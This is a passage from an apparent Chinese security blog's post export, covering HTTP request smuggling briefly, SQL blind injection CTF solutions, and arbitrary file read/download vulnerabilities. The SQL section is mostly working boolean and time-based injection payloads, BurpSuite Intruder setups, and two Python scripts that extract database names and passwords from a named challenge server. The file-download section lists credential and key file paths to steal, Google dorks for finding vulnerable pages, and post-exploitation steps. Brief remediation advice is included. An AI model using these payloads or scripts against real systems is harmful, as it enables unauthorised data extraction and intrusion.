Suite中，你可以使用Repeater菜单禁用此行为，确保你选择的工具具有相同的功能。6、通过Squid之类的代理来测试他们的测试人员的流量以进行监控。破坏测试人员发起的任何走私攻击请求，确保对此漏洞做到全面杜绝。 0x07 写在后面这次又学到了新的知识-HTTP请求走私。了解了HTTP请求走私的五种方式，以及一些PHP函数的使用。HTTP请求走私属于协议层攻击，是服务器漏洞的一种，应予以注意。","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://qwzf.github.io/categories/漏洞原理/"},{"name":"协议层漏洞","slug":"漏洞原理/协议层漏洞","permalink":"https://qwzf.github.io/categories/漏洞原理/协议层漏洞/"}],"tags":[{"name":"题目复现","slug":"题目复现","permalink":"https://qwzf.github.io/tags/题目复现/"},{"name":"HTTP","slug":"HTTP","permalink":"https://qwzf.github.io/tags/HTTP/"},{"name":"HTTP请求走私","slug":"HTTP请求走私","permalink":"https://qwzf.github.io/tags/HTTP请求走私/"}],"author":"qwzf"},{"title":"SQL盲注的简单分析","slug":"SQL盲注的简单分析","date":"2019-10-26T13:50:20.000Z","updated":"2020-08-01T16:33:47.616Z","comments":true,"path":"2019/10/26/SQL盲注的简单分析/","link":"","permalink":"https://qwzf.github.io/2019/10/26/SQL盲注的简单分析/","excerpt":"","text":"首发于先知社区 前言最近做了些基于布尔盲注和基于时间盲注的CTF题，掌握了CTF题中SQL盲注的三种解法，收获很大，于是结合题目分享一下。 BASE-Blind-Inject题目信息 题干分析第一次走进误区，刚看到这道题的时候看到了登录框，第一印象应该就是简单的闭合注入，测试后发现是双引号闭合，所以构造payload注入 &quot; or 1=1# 果然注入进去了。虽然没有出现flag，但给予了提示“flag就在数据库里面”，然后又想到题目标题，翻译成“简单盲注”并且flag在数据库？有页面返回？所以应该想到这是SQL注入的一种注入方式叫做布尔盲注,并且是POST型。 知识了解布尔盲注 布尔盲注利用前提 页面没有显示位，没有输出SQL语句执行错误信息，只能通过页面返回正常不正常来判断是否存在注入。 布尔盲注利用 该语句判断数据库个数，当数据库个数大于n页面显示正常(select count(schema_name) from information_schema.schemata)&gt; n 该语句判断数据库内第一个数据库名有多少字符，字符个数大于n页面显示正常(select length(schema_name) from information_schema.schemata limit 0,1)&gt; n 该语句判断第一个库第一个字符是什么，ascii值大于n页面显示正常(select ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1)))&gt;n 相关函数 Length()函数 返回字符串的长度 substr()截取字符串，偏移是从1开始，而不是0开始 ascii()返回字符的ascii码 count(column_name)函数返回指定列的值的数目(NULL 不计入) 开始测试 测闭合方式 输入’ or 1=1#不回显 输入” or 1=1#正常 可判定是双引号闭合。 测长度 判断数据库名的长度 输入” or (length(database())=10)–+正常 说明长度为8。 测字符 用substr()截取字符串的每个字符，ascii()将字符串转换成其ASCII码 输入” or (ascii(substr(database(),1,1))&gt;97)–+正常 盲注开始费心劳神-手工盲注利用二分法进行手工盲注。手工盲注可以使用BurpSuite，构造payload在Repeater点击Go进行发包，这样会比较便捷。1.猜库用到获取当前数据库函数database() 猜库长 &quot; or (length(database())=10)--+正常 所以数据库长度为10 猜库名第一个字符 &quot; or (ascii(substr(database(),1,1))&gt;32)--+正常 &quot; or (ascii(substr(database(),1,1))&gt;128)--+不回显 &quot; or (ascii(substr(database(),1,1))&gt;80)--+正常 &quot; or (ascii(substr(database(),1,1))&gt;104)--+不回显 &quot; or (ascii(substr(database(),1,1))&gt;92)--+正常 &quot; or (ascii(substr(database(),1,1))&gt;98)--+正常 &quot; or (ascii(substr(database(),1,1))&gt;101)--+不回显 &quot; or (ascii(substr(database(),1,1))&gt;100)--+不回显 &quot; or (ascii(substr(database(),1,1))&gt;99)--+不回显 说明数据库名的第一个字符ASCII码为99，即“c”。第二个字符 &quot; or (ascii(substr(database(),2,1))&gt;32)--+正常 &quot; or (ascii(substr(database(),2,1))&gt;128)--+不回显 &quot; or (ascii(substr(database(),2,1))&gt;80)--+正常 &quot; or (ascii(substr(database(),2,1))&gt;104)--+不回显 &quot; or (ascii(substr(database(),2,1))&gt;92)--+正常 &quot; or (ascii(substr(database(),2,1))&gt;98)--+正常 &quot; or (ascii(substr(database(),2,1))&gt;101)--+正常 &quot; or (ascii(substr(database(),2,1))&gt;102)--+正常 &quot; or (ascii(substr(database(),2,1))&gt;103)--+正常 说明数据库名的第二个字符ASCII码为104，即“h”。依次猜解，最终得到数据库名：challenges 2.猜表 猜表长 &quot; or (length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6)--+正常 所以数据表长度为6 猜表名第一个字符 &quot; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;32)--+正常 &quot; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;128)--+不回显 &quot; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80)--+正常 &quot; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;104)--+正常 &quot; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;116)--+正常 &quot; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;122)--+不回显 &quot; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;119)--+不回显 &quot; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;119)--+不回显 &quot; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;118)--+不回显 &quot; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;117)--+不回显 说明数据表名的第一个字符ASCII码为117，即“u”。依次猜解，最终得到数据表名：user_2 3.猜字段 猜字段长 &quot; or (length((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 0,1))=2)--+正常 &quot; or (length((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 1,1))=8)--+正常 &quot; or (length((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 2,1))=8)--+正常 所以user_2表的数据字段长度分别为2、8、8 猜字段名第一个字段 &quot; or (ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 0,1),1,1))&gt;32)--+正常 &quot; or (ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 0,1),1,1))&gt;128)--+不回显 &quot; or (ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 0,1),1,1))&gt;80)--+正常 &quot; or (ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 0,1),1,1))&gt;104)--+正常 &quot; or (ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 0,1),1,1))&gt;116)--+不回显 &quot; or (ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 0,1),1,1))&gt;110)--+不回显 &quot; or (ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 0,1),1,1))&gt;107)--+不回显 &quot; or (ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 0,1),1,1))&gt;106)--+不回显 &quot; or (ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 0,1),1,1))&gt;105)--+不回显 所以user_2表的第一个字段的字段名的第一个字符ASCII码为105，即“i”。猜第二个字段把limit 0,1改为limit 1,1猜第三个字段把limit 0,1改为limit 2,1依次猜解,最终得到user_2表的3个字段名分别为：id username password 3.猜数据 猜数据长 &quot; or (length((select password from challenges.user_2 limit 1,1))=32)--+正常 所以user_2表的password字段的第2条数据的数据长度为32，这个应该就是flag那条数据了 猜数据值 &quot; or (ascii(substr((select password from challenges.user_2 limit 1,1),1,1))&gt;32)--+正常 &quot; or (ascii(substr((select password from challenges.user_2 limit 1,1),1,1))&gt;128)--+不回显 &quot; or (ascii(substr((select password from challenges.user_2 limit 1,1),1,1))&gt;80)--+正常 &quot; or (ascii(substr((select password from challenges.user_2 limit 1,1),1,1))&gt;104)--+不回显 &quot; or (ascii(substr((select password from challenges.user_2 limit 1,1),1,1))&gt;92)--+正常 &quot; or (ascii(substr((select password from challenges.user_2 limit 1,1),1,1))&gt;98)--+正常 &quot; or (ascii(substr((select password from challenges.user_2 limit 1,1),1,1))&gt;101)--+正常 &quot; or (ascii(substr((select password from challenges.user_2 limit 1,1),1,1))&gt;102)--+不回显 说明user_2表的password字段的第2条数据(limit 1,1意思是从1开始取(即第二条数据)，取一条数据。)的数据值的第一个字符ASCII码为102，即“f”。依次猜解,最终得到flag 简便之法-BurpSuite半自动化盲注一步一步的利用二分法进行手工盲注，是不是有点麻烦了呢？能不能让BurpSuite自己进行按顺序进行一个一个猜解呢？于是用到了BurpSuite的一个功能模块Intruder，构造payload设置变量进行爆破，然后根据返回长度进行排序整理。1、爆库payload &quot; or (ascii(substr(database(),§1§,1))=§32§)--+ 先随便输入用户名和密码，然后BurpSuite抓包，发送到Intruder 设置Positions 设置两个变量的爆破类型 开始爆破，根据返回长度确定爆破结果 排序、转换字符 payload2那一列即是数据库名每个字符的ASCII码，按照payload1进行排序，再转换成字符，得到数据库名 2、爆表payload &quot; or (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),§1§,1))=§32§)--+ 与爆库的不同之处就是payload和结果长度，改一下 开始爆破，根据返回长度确定爆破结果 排序、转换字符 3、爆字段payload &quot; or (ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 2,1),§1§,1))=§32§)--+ 与爆库的不同之处就是payload和结果长度，改一下(结果长度改为8) 开始爆破，根据返回长度确定爆破结果 排序、转换字符 3、爆数据payload &quot; or (ascii(substr((select password from challenges.user_2 limit 1,1),§1§,1))=§32§)--+ 与爆库的不同之处就是payload和结果长度，改一下(结果长度改为32) 开始爆破，根据返回长度确定爆破结果 排序、转换字符 提高效率为了省去转换字符并减少爆破时间，可以选择不使用ascii()函数，第二个变量的爆破类型改成Simple list如：爆库payload &quot; or (substr(database(),§1§,1)=&#39;§a§&#39;)--+ 爆破结果：发现没有区分大小写，所以再通过每个字符的ascii码是否大于等于97判断每个字符是大写还是小写，小于97即大写。这样就提高了一点效率。 神来之笔-脚本盲注使用BurpSuite半自动化盲注，看似可以。但是不是有一种方法，可以不用其他操作，轻松得到数据库的信息呢？于是想到使用脚本进行盲注来提高效率。布尔盲注脚本如下： import requests chars=&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_,;{}&amp;=+&#39; postdata={ &#39;username&#39;:&#39;&quot; or 1=1#&#39;, &#39;password&#39;:&#39;admin&#39; } url=&quot;http://35.201.188.231:9000/challenge-02/post.php&quot; r=requests.post(url,data=postdata) length=len(r.text) def name(url,length): dbname=&#39;&#39; print(&quot;数据库名：&quot;,dbname) payload=&#39;&quot; or ascii(substr(database(),{0},1))={1} #&#39; #print(&quot;数据表名：&quot;,dbname) #payload=&#39;&quot;or ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{0},1))={1}#&#39; #print(&quot;字段名：&quot;,dbname) #payload=&#39;&quot;or ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_2&#39; and table_schema=database() limit 1,1),{0},1))={1}#&#39; #print(&quot;数据：&quot;,dbname) #payload=&#39;&quot; or ascii(substr((select password from user_2 limit 1,1),{0},1))={1}#&#39; for i in range(1,40): char=&#39;&#39; for x in chars: char_ascii=ord(x) payloads=payload.format(i,char_ascii) postdata={ &#39;username&#39;:payloads, &#39;password&#39;:&#39;admin&#39; } r=requests.post(url,data=postdata) if len(r.text) == length: dbname+=x print(dbname) char=x break if char==&#39;&#39;: break return dbname name(url,length) 测试一下如果传参方式是get传参，只需在url后添加? 参数名=，再将requests.post改成requests.get即可。 BASE-TIME-BLIND-INJECT题目信息 题干分析第二次走进误区，刚看到这道题的时候从题目标题看出是时间盲注。试了单引号闭合和和双引号闭合，结果并没有什么用，于是查看了一下源码，发现关键点了。竟然有源码可以下载！查看下载的源码，发现是 &#39;&quot; 闭合，并且传参为POST传参。 知识了解时间盲注 时间盲注利用前提 页面上没有显示位，也没有输出SQL语句执行错误信息。 正确的SQL语句和错误的SQL语句返回页面都一样，但是加入sleep(5)条件之后，页面的返回速度明显慢了5秒。 时间盲注利用 该语句判断数据库个数，当数据库个数等于n页面返回延迟5秒if((select count(schema_name) from information_schema.schemata)=n,sleep(5),1) 该语句判断数据库内第一个数据库名有多少字符，字符个数等于n页面返回延迟5秒if((select length(schema_name) from information_schema.schemata limit 0,1)=n,sleep(5),1) 该语句判断第一个库第一个字符是什么，ascii值等于n页面返回延迟5秒if((select ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1)))=n,sleep(5),1) 相关函数 Length（）函数 返回字符串的长度 substr（）截取字符串 ascii（）返回字符的ascii码 sleep(n)：将程序挂起一段时间 n为n秒 if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句 count(column_name)函数返回指定列的值的数目(NULL 不计入) 开始测试 测试语句 输入’” or if(1=1,sleep(5),1)#延迟5秒 输入’” or if(1=2,sleep(5),1)#正常 测长度 判断数据库名的长度 输入’” or if((length(database())=10),sleep(5),1)–+延迟5秒 说明长度为8。 测字符 用substr()截取字符串的每个字符，ascii()将字符串转换成其ASCII码 输入’” or if((ascii(substr(database(),1,1))&gt;97),sleep(5),1)–+延迟5秒 盲注开始费心劳神-手工盲注同样利用二分法进行手工盲注，与布尔盲注不同之处是页面上没有回显，所以使用了if()函数和sleep()函数，根据返回时间判断。同样可以使用BurpSuite进行测试。1.猜库用到获取当前数据库函数database() 猜库长 &#39;&quot; or if((length(database())=10),sleep(5),1)--+延迟5秒 所以数据库长度为10 猜库名第一个字符 &#39;&quot; or if((ascii(substr(database(),1,1))&gt;32),sleep(5),1)--+延迟5秒 &#39;&quot; or if((ascii(substr(database(),1,1))&gt;128),sleep(5),1)--+正常 &#39;&quot; or if((ascii(substr(database(),1,1))&gt;80),sleep(5),1)--+延迟5秒 &#39;&quot; or if((ascii(substr(database(),1,1))&gt;104),sleep(5),1)--+正常 &#39;&quot; or if((ascii(substr(database(),1,1))&gt;92),sleep(5),1)--+延迟5秒 &#39;&quot; or if((ascii(substr(database(),1,1))&gt;98),sleep(5),1)--+延迟5秒 &#39;&quot; or if((ascii(substr(database(),1,1))&gt;101),sleep(5),1)--+正常 &#39;&quot; or if((ascii(substr(database(),1,1))&gt;100),sleep(5),1)--+正常 &#39;&quot; or if((ascii(substr(database(),1,1))&gt;99),sleep(5),1)--+正常 说明数据库名的第一个字符ASCII码为99，即“c”。依次猜解，最终得到数据库名：challenges 2.猜表 猜表长 &#39;&quot; or if((length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6),sleep(5),1)--+延迟5秒 所以数据表长度为6 猜表名第一个字符 &#39;&quot; or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;32),sleep(5),1)--+延迟5秒 &#39;&quot; or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;128),sleep(5),1)--+正常 &#39;&quot; or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80),sleep(5),1)--+延迟5秒 &#39;&quot; or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;104),sleep(5),1)--+延迟5秒 &#39;&quot; or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;116),sleep(5),1)--+延迟5秒 &#39;&quot; or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;122),sleep(5),1)--+正常 &#39;&quot; or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;119),sleep(5),1)--+正常 &#39;&quot; or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;119),sleep(5),1)--+正常 &#39;&quot; or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;118),sleep(5),1)--+正常 &#39;&quot; or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;117),sleep(5),1)--+正常 说明数据表名的第一个字符ASCII码为117，即“u”。依次猜解，最终得到数据表名：user_3 3.猜字段 猜字段长 &#39;&quot; or if((length((select column_name from information_schema.columns where table_name=&#39;user_3&#39; and table_schema=database() limit 0,1))=2),sleep(5),1)--+延迟5秒 &#39;&quot; or if((length((select column_name from information_schema.columns where table_name=&#39;user_3&#39; and table_schema=database() limit 1,1))=8),sleep(5),1)--+延迟5秒 &#39;&quot; or if((length((select column_name from information_schema.columns where table_name=&#39;user_3&#39; and table_schema=database() limit 2,1))=8),sleep(5),1)--+延迟5秒 所以user_3表的数据字段长度分别为2、8、8 猜字段名第一个字段 &#39;&quot; or if((ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_3&#39; and table_schema=database() limit 0,1),1,1))&gt;32),sleep(5),1)--+延迟5秒 &#39;&quot; or if((ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_3&#39; and table_schema=database() limit 0,1),1,1))&gt;128),sleep(5),1)--+正常 &#39;&quot; or if((ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_3&#39; and table_schema=database() limit 0,1),1,1))&gt;80),sleep(5),1)--+延迟5秒 &#39;&quot; or if((ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_3&#39; and table_schema=database() limit 0,1),1,1))&gt;104),sleep(5),1)--+延迟5秒 &#39;&quot; or if((ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_3&#39; and table_schema=database() limit 0,1),1,1))&gt;116),sleep(5),1)--+正常 &#39;&quot; or if((ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_3&#39; and table_schema=database() limit 0,1),1,1))&gt;110),sleep(5),1)--+正常 &#39;&quot; or if((ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_3&#39; and table_schema=database() limit 0,1),1,1))&gt;107),sleep(5),1)--+正常 &#39;&quot; or if((ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_3&#39; and table_schema=database() limit 0,1),1,1))&gt;106),sleep(5),1)--+正常 &#39;&quot; or if((ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_3&#39; and table_schema=database() limit 0,1),1,1))&gt;105),sleep(5),1)--+正常 所以user_3表的第一个字段的字段名的第一个字符ASCII码为105，即“i”。依次猜解,最终得到user_3表的3个字段名分别为：id username password 3.猜数据 猜数据长 &#39;&quot; or if((length((select password from challenges.user_3 limit 1,1))=25),sleep(5),1)--+延迟5秒 所以user_3表的password字段的第2条数据的数据长度为25，这个应该就是flag那条数据了 猜数据值 &#39;&quot; or if((ascii(substr((select password from challenges.user_3 limit 1,1),1,1))&gt;32),sleep(5),1)--+延迟5秒 &#39;&quot; or if((ascii(substr((select password from challenges.user_3 limit 1,1),1,1))&gt;128),sleep(5),1)--+正常 &#39;&quot; or if((ascii(substr((select password from challenges.user_3 limit 1,1),1,1))&gt;80),sleep(5),1)--+延迟5秒 &#39;&quot; or if((ascii(substr((select password from challenges.user_3 limit 1,1),1,1))&gt;104),sleep(5),1)--+正常 &#39;&quot; or if((ascii(substr((select password from challenges.user_3 limit 1,1),1,1))&gt;92),sleep(5),1)--+延迟5秒 &#39;&quot; or if((ascii(substr((select password from challenges.user_3 limit 1,1),1,1))&gt;98),sleep(5),1)--+延迟5秒 &#39;&quot; or if((ascii(substr((select password from challenges.user_3 limit 1,1),1,1))&gt;101),sleep(5),1)--+延迟5秒 &#39;&quot; or if((ascii(substr((select password from challenges.user_3 limit 1,1),1,1))&gt;102),sleep(5),1)--+正常 说明user_3表的password字段的第2条数据(limit 1,1意思是从1开始取(即第二条数据)，取一条数据。)的数据值的第一个字符ASCII码为102，即“f”。依次猜解,最终得到flag 简便之法-BurpSuite半自动化盲注和布尔盲注一样，时间盲注是不是也可以进行构造payload，并设置变量进行爆破呢？发现与布尔盲注不同之处就是使用了sleep()和if()。并且对爆破结果要根据返回时间进行整理排序。1、爆库payload &quot; or if((ascii(substr(database(),§1§,1))=§32§),sleep(5),1)--+ 先随便输入用户名和密码，然后BurpSuite抓包，发送到Intruder 设置Positions 设置两个变量的爆破类型 开始爆破，根据返回时间确定爆破结果 凡是Timer&gt;10000的payload2即为数据库名的每个字符的ASCII 排序、转换字符 Timer&gt;10000的payload2每个字符的ASCII码，按照payload1进行排序，再转换成字符，得到数据库名 2、爆表payload &quot; or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),§1§,1))=§32§),sleep(5),1)--+ 与爆库的不同之处就是payload和结果长度(结果长度由10改为6)。然后开始爆破，根据返回时间确定爆破结果。最后排序、转换字符。最后得到表名为：user_3 3、爆字段payload &quot; or if((ascii(substr((select column_name from information_schema.columns where table_name=&#39;user_3&#39; and table_schema=database() limit 2,1),§1§,1))=§32§),sleep(5),1)--+ 上述payload爆第三个字段，与爆库的不同之处就是payload和结果长度，改一下(结果长度改为8)。然后开始爆破，根据返回时间确定爆破结果。最后排序、转换字符，得到第三个字段为：password 3、爆数据payload &quot; or if((ascii(substr((select password from challenges.user_3 limit 1,1),§1§,1))=§32§),sleep(5),1)--+ 与爆库的不同之处就是payload和结果长度，改一下(结果长度改为25)。然后开始爆破，根据返回时间确定爆破结果。最后排序、转换字符，得到最终flag。提高效率当然时间盲注也可以用布尔盲注的那种方法提高效率，即选择不使用ascii()函数。与布尔盲注不同之处是使用了sleep()函数和if(expr1,expr2,expr3)函数。####神来之笔-脚本盲注和布尔盲注一样，是不是也可以写一个时间盲注脚本来提高效率呢？于是想到用python里的time.time()函数，返回当前时间的时间戳。记录提交和返回过程的时间差，然后进行判断。时间盲注脚本如下： import requests import time import string import sys chars=&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_,;{}&amp;=+&#39; url=&quot;http://35.201.188.231:9000/challenge-03/post.php&quot; dbname=&#39;&#39; payload=&quot;&#39;\\&quot; or if((ascii(substr(database(),{0},1))={1}),sleep(5),1) #&quot; print(&quot;数据库名：&quot;,dbname) #payload=&quot;&#39;\\&quot;or if((ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),{0},1))={1}),sleep(5),1) #&quot; #print(&quot;数据表名：&quot;,dbname) #payload=&quot;&#39;\\&quot;or if((ascii(substr((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;user_3&quot; limit 1,1),{0},1))={1}),sleep(5),1) #&quot; #print(&quot;字段名：&quot;,dbname) #payload=&quot;&#39;\\&quot; or if((ascii(substr((select password from user_3 limit 1,1),{0},1))={1}),sleep(5),1) #&quot; #print(&quot;数据：&quot;,dbname) for i in range(1,40): char=&#39;&#39; for x in chars: char_ascii=ord(x) payloads=payload.format(i,char_ascii) start=time.time() postdata={ &#39;username&#39;:payloads, &#39;password&#39;:&#39;admin&#39; } r=requests.post(url,data=postdata) if (time.time() - start)&gt;=5: dbname+=x print(dbname) char=x break if char==&#39;&#39;: break 测试一下同样如果传参方式是get传参，只需在url后添加? 参数名=，再将requests.post改成requests.get即可。 SQL盲注的利用在一些SQL注入中往往有用到SQL盲注的方法，进行猜解数据库信息。比如在order by排序注入中，利用基于时间盲注的方法。 select * from users order by id desc; 因为desc是可控的传参值。所以可进行注入基于时间盲注 ?order=if(1=1,1,sleep(5)) 正常响应时间 ?order=if(1=2,1,sleep(5)) 延迟5秒 SQL盲注漏洞的修复方案SQL盲注的危害大家也都看到了，但是我们该如何防止这种情况的发生呢？简单来讲，就是永远不要相信用户的输入。所以要对请求进行过滤，对参数进行验证，对非法字符进行拦截替换，清理用户输入的危险字符，保证sql能够在数据库中正确的编译和执行。这便是解决SQL盲注的简单思路。 当然，还有另一种方法，就是不使用SQL拼接语句。先在后台进行SQL查询，然后将查询结果与用户输入进行比对。 总结从两道SQL盲注的CTF题中，明白SQL盲注的三种解法，以及SQL盲注的危害和利用。同时也想到一些修复方案。总之收获很大。但本人文采有限，操作生疏。若有任何不当之处，还望各位师傅指出。","categories":[{"name":"漏洞原理","slug":"漏洞原理","permalink":"https://qwzf.github.io/categories/漏洞原理/"},{"name":"SQL注入","slug":"漏洞原理/SQL注入","permalink":"https://qwzf.github.io/categories/漏洞原理/SQL注入/"}],"tags":[{"name":"SQL盲注","slug":"SQL盲注","permalink":"https://qwzf.github.io/tags/SQL盲注/"}],"author":"qwzf"},{"title":"任意文件读取与下载漏洞","slug":"任意文件读取与下载漏洞","date":"2019-10-18T17:01:11.511Z","updated":"2020-08-01T17:01:45.152Z","comments":true,"path":"2019/10/19/任意文件读取与下载漏洞/","link":"","permalink":"https://qwzf.github.io/2019/10/19/任意文件读取与下载漏洞/","excerpt":"","text":"0x00前言上周参加了一个线上赛。有个Web题的WriteUp说是任意文件下载。由于之前没学过，所以就没有想到。现在学习一下 0x01为什么产生任意文件读取与下载漏洞 一些网站的业务需要，可能提供文件查看或下载的功能，如果对用户查看或下载的文件不做限制，就能够查看或下载任意的文件，可以是源文件，敏感文件等等。 0x02任意文件读取漏洞任意文件读取是属于文件操作漏洞的一种，一般任意文件读取漏洞可以读取配置信息甚至系统重要文件。严重的话，就可能导致SSRF，进而漫游至内网。漏洞产生原因 存读取文件的函数 读取文件的路径用户可控，且未校验或校验不严 输出了文件内容 任意文件读取 &lt;?php $filename=”test.txt”; readfile($filename); ?&gt; &lt;?php $filename=”test.txt”; echo file_get_contents($filename); ?&gt; 文件读取函数readfile()、file_get_contents()、fopen()中，$filename没有经过校验或者校验不合格，用户可控制变量读取任意文件，如/etc/passwd、./index.php、/config.ini。 0x03任意文件下载漏洞一些网站由于业务需求，往往需要提供文件下载功能，但若对用户下载的文件不做限制，则恶意用户就能够下载任意敏感文件，这就是文件下载漏洞。漏洞产生原因 有读取文件的函数 读物文件的路径用户可控，且没有经过校验，或者校验不严格 输出文件内容 一个正常的网站，存在一个下载文件的功能，同时还会从浏览器接收文件名字 文件下载的两种方式1、直接下载： &lt;a href=”http://www.a.com/xxx.rar”&gt;下载&lt;/a&gt; 2、增加header头 &lt;?php $filename = $_GET[&#39;filename&#39;]; echo &#39;&lt;h1&gt;讲开始下载文件！&lt;/h1&gt;&lt;br /&gt;&lt;br /&gt;&#39;; echo file_get_contents($filename); header(&#39;Content-Type: imgage/jpeg&#39;); header(&#39;Content-Disposition: attachment; filename=&#39;.$filename); header(&#39;Content-Lengh: &#39;.filesize($filename)); ?&gt; 漏洞利用方式利用思路 下载常规的配置文件，例如: ssh,weblogic,ftp,mysql等相关配置 下载各种.log文件，从中寻找一些后台地址，文件上传点之类的地方，如果运气好的话会获得一些前辈们的后门。 下载web业务文件进行白盒审计，利用漏洞进一步攻入服务器。 尝试读取/root/.bash_history看自己是否具有root权限。如果没有，就只能利用../来回跳转读取一些.ssh下的配置信息文件。读取mysql下的.bash_history文件。来查看是否记录了一些可以利用的相关信息。然后逐个下载需要审计的代码文件，但是下载的时候变得很繁琐，只能尝试去猜解目录，然后下载一些中间件的记录日志进行分析。 一些常见利用方式 java+oracle环境可以先下载/WEB-INF/classes/applicationContext.xml 文件，这里面记载的是web服务器的相应配置，然后下载/WEB-INF/classes/xxx/xxx/ccc.class对文件进行反编译，然后搜索文件中的upload关键字看是否存在一些api接口，如果存在的话我们可以本地构造上传页面用api接口将我们的文件传输进服务器。 也可以先下载网站的配置文件，在根目录/WEB-INF/Web.xml的(一般都有很多内容,有时含有数据库连接用户名和密码等关键信息)。 具有root权限在linux中有这样一个命令 locate 是用来查找文件或目录的，它不搜索具体目录，而是搜索一个数据库/var/lib/mlocate/mlocate.db。这个数据库中含有本地所有文件信息。Linux系统自动创建这个数据库，并且每天自动更新一次。 当我们不知道路径是什么的情况下，这个可以说是一个核武器了，我们利用任意文件下载漏洞将mlocate.db文件下载下来，利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息。locate 读取方法 locate mlocate.db admin 可以将mlocate.db中包含admin内容全部输出来。利用这个文件可以获取到该服务器任何我们想要的内容并下载出来而不用一个一个去猜解目录，但是这个文件只有root用户才能读取。另一方面我们也可以利用linux内核的一个文件/proc/self/cmdline当前进程的cmdline参数，可以获取到路径信息。 总的来说，任意文件下载漏洞的利用主要是为了信息收集，我们通过对服务器配置文件的下载，获取到大量的配置信息、源码，从而根据获取的信息来进一步挖掘服务器漏洞从而入侵。 0x04任意文件读取与下载漏洞挖掘 1、web漏洞扫描器（awvs、appscan、openvas、nessus）2、手动挖掘从连接和参数名查看 Google search inurl:”readfile.php?file= inurl:”read.php?filename= inurl:”download.php?file= inurl:”down.php?file= 连接：readfile.php?file=**.txtdownload.php?file=**.rar参数名：&amp;RealPath=、&amp;readpath=、&amp;FilePath=、&amp;filepath=、&amp;Path=、&amp;path=、&amp;Inputfile=、&amp;inputfile=、&amp;url=、&amp;urls=、&amp;Lang=、&amp;dis=、&amp;Data=、&amp;data=、&amp;readfile=、&amp;ﬁlep=、&amp;Src=、&amp;src=、&amp;menu=、META-INF= 、WEB-INF 0x05敏感信息Windows： C:\\boot.ini //查看系统版本C:\\Windows\\System32\\inetsrv\\MetaBase.xml //IIS配置文件C:\\Windows\\repair\\sam //存储系统初次安装的密码C:\\Program Files\\mysql\\my.ini //Mysql配置C:\\Program Files\\mysql\\data\\mysql\\user.MYD //Mysql rootC:\\Windows\\php.ini //php配置信息C:\\Windows\\my.ini //Mysql配置信息 Linux： /root/.ssh/authorized_keys //如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去/root/.ssh/id_rsa 